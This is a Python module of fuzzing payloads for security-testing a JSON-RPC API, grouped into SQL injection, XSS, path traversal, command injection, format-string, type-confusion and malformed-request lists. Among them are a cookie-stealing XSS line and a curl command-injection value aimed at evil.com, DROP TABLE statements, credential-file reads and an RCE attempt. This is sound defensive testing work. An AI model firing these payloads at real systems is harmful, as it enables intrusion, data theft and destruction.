"""Malicious payload generators for JSON-RPC API security fuzzing.

Provides categorized payloads for SQL injection, XSS, path traversal,
type confusion, boundary values, null/special bytes, format strings,
command injection, and JSON-RPC protocol abuse.
"""

from __future__ import annotations

from typing import Any

# ---------------------------------------------------------------------------
# SQL Injection
# ---------------------------------------------------------------------------

SQLI_STRINGS: list[str] = [
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "'; DROP TABLE tasks; --",
    "'; DROP TABLE users; --",
    "' UNION SELECT 1,2,3,4,5 --",
    "' UNION SELECT username,password FROM users --",
    "1; SELECT * FROM information_schema.tables --",
    "1' AND SLEEP(5) --",
    "1' AND BENCHMARK(10000000,SHA1('test')) --",
    "' AND 1=CONVERT(int,(SELECT @@version)) --",
    "1' ORDER BY 100 --",
    "1' HAVING 1=1 --",
    "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version()))) --",
    "admin'--",
    "1; WAITFOR DELAY '0:0:5' --",
    (
        "1' AND (SELECT * FROM (SELECT COUNT(*),CONCAT((SELECT version())"
        ",0x3a,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)y) --"
    ),
    "\\x27 OR 1=1 --",
    "${7*7}",
    "{{7*7}}",
]

SQLI_INTEGERS: list[Any] = [
    "1 OR 1=1",
    "1; DROP TABLE tasks",
    "-1 UNION SELECT 1,2,3",
    "0x31",
    "1e999",
]

# ---------------------------------------------------------------------------
# Cross-Site Scripting (XSS)
# ---------------------------------------------------------------------------

XSS_STRINGS: list[str] = [
    '<script>alert("xss")</script>',
    '<img src=x onerror=alert("xss")>',
    '<svg/onload=alert("xss")>',
    "javascript:alert(1)",
    '"><script>alert(document.cookie)</script>',
    "'-alert(1)-'",
    '<iframe src="javascript:alert(1)">',
    "<body onload=alert(1)>",
    "<input onfocus=alert(1) autofocus>",
    "{{constructor.constructor('return this')()}",
    '<img src="x" onerror="fetch(\'http://evil.com/?\'+document.cookie)">',
    "<details open ontoggle=alert(1)>",
]

# ---------------------------------------------------------------------------
# Path Traversal / LFI
# ---------------------------------------------------------------------------

PATH_TRAVERSAL_STRINGS: list[str] = [
    "../../../etc/passwd",
    "..\\..\\..\\windows\\system32\\config\\sam",
    "....//....//....//etc/passwd",
    "/etc/passwd",
    "file:///etc/passwd",
    "/var/www/app/config.php",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "....//....//etc/shadow",
    "/proc/self/environ",
    "php://filter/convert.base64-encode/resource=/etc/passwd",
    "php://input",
    "expect://id",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
]

# ---------------------------------------------------------------------------
# Command Injection
# ---------------------------------------------------------------------------

COMMAND_INJECTION_STRINGS: list[str] = [
    "; ls -la",
    "| cat /etc/passwd",
    "$(whoami)",
    "`whoami`",
    "&& cat /etc/passwd",
    "|| cat /etc/passwd",
    "; sleep 10",
    "| sleep 10",
    "\n/bin/cat /etc/passwd",
    "$(curl http://evil.com/)",
]

# ---------------------------------------------------------------------------
# Format String
# ---------------------------------------------------------------------------

FORMAT_STRING_PAYLOADS: list[str] = [
    "%s%s%s%s%s%s%s%s%s%s",
    "%x%x%x%x%x%x%x%x",
    "%n%n%n%n%n%n%n%n",
    "%d%d%d%d%d%d%d%d",
    "AAAA%08x.%08x.%08x.%08x",
]

# ---------------------------------------------------------------------------
# Null / Special Bytes
# ---------------------------------------------------------------------------

NULL_BYTE_STRINGS: list[str] = [
    "test\x00admin",
    "\x00",
    "test\x00",
    "\x00\x00\x00\x00",
    "test\x00.php",
]

UNICODE_EDGE_CASES: list[str] = [
    "\uffff",
    "\ud800",  # lone surrogate (invalid)
    "\udbff",  # lone high surrogate
    "\x80\x81\x82",
    "Ā" * 1000,  # multibyte flood
    "\u202e" + "admin",  # right-to-left override
    "\ufeff" + "test",  # BOM prefix
    "\u0000test",
]

# ---------------------------------------------------------------------------
# Boundary Values
# ---------------------------------------------------------------------------

BOUNDARY_INTEGERS: list[Any] = [
    0,
    -1,
    -999999999,
    2147483647,  # INT_MAX (32-bit)
    2147483648,  # INT_MAX + 1
    -2147483648,  # INT_MIN
    -2147483649,  # INT_MIN - 1
    9999999999999999,
    9.999999999e18,
]

BOUNDARY_STRINGS: list[str] = [
    "",  # empty
    " ",  # whitespace
    "   \t\n\r  ",  # mixed whitespace
    "a" * 256,  # just over typical varchar(255)
    "a" * 1000,
    "a" * 10000,
    "a" * 100000,  # 100KB string
]

# ---------------------------------------------------------------------------
# Type Confusion
# ---------------------------------------------------------------------------

TYPE_CONFUSION_FOR_STRING: list[Any] = [
    None,
    True,
    False,
    0,
    -1,
    3.14,
    [],
    {},
    [1, 2, 3],
    {"key": "value"},
    ["nested", ["list"]],
]

TYPE_CONFUSION_FOR_INT: list[Any] = [
    None,
    True,
    False,
    "",
    "abc",
    "1.5",
    "0x1f",
    3.14,
    -0.001,
    [],
    {},
    [1],
    {"id": 1},
    "null",
    "undefined",
    "NaN",
    "Infinity",
]

# ---------------------------------------------------------------------------
# JSON-RPC Protocol Abuse
# ---------------------------------------------------------------------------


def malformed_envelopes() -> list[dict[str, Any]]:
    """Return a list of malformed JSON-RPC envelopes for protocol fuzzing.

    Returns:
        A list of dicts, each representing a broken JSON-RPC request.
    """
    return [
        {},  # empty object
        {"jsonrpc": "2.0"},  # missing method
        {"jsonrpc": "2.0", "method": ""},  # empty method
        {"jsonrpc": "2.0", "method": None},  # null method
        {"jsonrpc": "2.0", "method": 12345},  # numeric method
        {"jsonrpc": "1.0", "method": "getVersion", "id": 1},  # wrong version
        {"jsonrpc": "2.0", "method": "getVersion", "id": "abc"},  # string id
        {"jsonrpc": "2.0", "method": "getVersion", "id": None},  # null id
        {"jsonrpc": "2.0", "method": "getVersion", "id": -1},  # negative id
        {
            "jsonrpc": "2.0",
            "method": "getVersion",
            "id": 1,
            "params": "not-an-object",
        },  # params is a string
        {
            "jsonrpc": "2.0",
            "method": "getVersion",
            "id": 1,
            "params": [1, 2, 3],
        },  # positional params
        {"jsonrpc": "2.0", "method": "getVersion", "id": 1, "params": None},  # null params
        {
            "jsonrpc": "2.0",
            "method": "nonExistentMethod_xyzzy",
            "id": 1,
            "params": {},
        },  # unknown method
        {"jsonrpc": "2.0", "method": "__construct", "id": 1, "params": {}},  # PHP magic method
        {
            "jsonrpc": "2.0",
            "method": "call_user_func",
            "id": 1,
            "params": {"func": "system", "args": "id"},
        },  # RCE attempt
        {
            "jsonrpc": "2.0",
            "method": "getVersion",
            "id": 1,
            "params": {},
            "extra_field": "surprise",
        },  # extra field
    ]


def raw_malformed_bodies() -> list[str]:
    """Return raw malformed HTTP request bodies (not valid JSON objects).

    Returns:
        A list of raw strings for sending as HTTP POST bodies.
    """
    return [
        "",  # empty body
        "not json at all",  # plain text
        "{invalid json}}}",  # broken JSON
        '{"jsonrpc": "2.0"',  # truncated JSON
        "null",  # JSON null
        "true",  # JSON boolean
        "42",  # JSON number
        '"just a string"',  # JSON string
        "[]",  # empty array
        '{"jsonrpc":"2.0","method":"getTask","id":1,"params":{"task_id":NaN}}',
        '{"jsonrpc":"2.0","method":"getTask","id":1,"params":{"task_id":Infinity}}',
        "["
        + '{"jsonrpc":"2.0","method":"getVersion","id":1,"params":{}},' * 1000
        + "]",  # huge batch
    ]


# ---------------------------------------------------------------------------
# Combined generators
# ---------------------------------------------------------------------------


def string_attack_payloads() -> list[Any]:
    """Return all string-oriented attack payloads combined.

    Returns:
        A flat list of all string attack vectors.
    """
    return (
        SQLI_STRINGS
        + XSS_STRINGS
        + PATH_TRAVERSAL_STRINGS
        + COMMAND_INJECTION_STRINGS
        + FORMAT_STRING_PAYLOADS
        + NULL_BYTE_STRINGS
        + UNICODE_EDGE_CASES
        + BOUNDARY_STRINGS
    )


def integer_attack_payloads() -> list[Any]:
    """Return all integer-oriented attack payloads combined.

    Returns:
        A flat list of all integer attack vectors (including type confusion).
    """
    return SQLI_INTEGERS + BOUNDARY_INTEGERS + TYPE_CONFUSION_FOR_INT
